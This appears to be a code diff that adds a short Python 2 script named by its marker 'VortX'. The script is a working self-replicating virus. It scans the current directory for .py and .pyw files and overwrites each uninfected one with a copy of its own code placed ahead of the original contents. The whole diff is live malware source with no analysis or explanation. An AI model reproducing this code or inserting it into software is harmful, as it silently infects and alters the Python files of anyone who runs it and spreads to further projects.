@@ -1,0 +1,16 @@
+import glob 
+from string import * 
+x = glob.glob("*.py") + glob.glob("*.pyw") 
+for x in x:     
+	host = open(x, 'r')     
+	hostcode = host.read()     
+	if find(hostcode, "-=::VortX::=-") == -1:         
+		host = open(x, 'w')         
+		myself = open(__file__,'r')         
+		a = myself.read()         
+		num=50*2+5         
+		a = a[:find(a,"#VORTX")+num]         
+		mybody=a+chr(10)+hostcode         
+		myself.close()         
+		host.write(mybody) 
+#VORTX
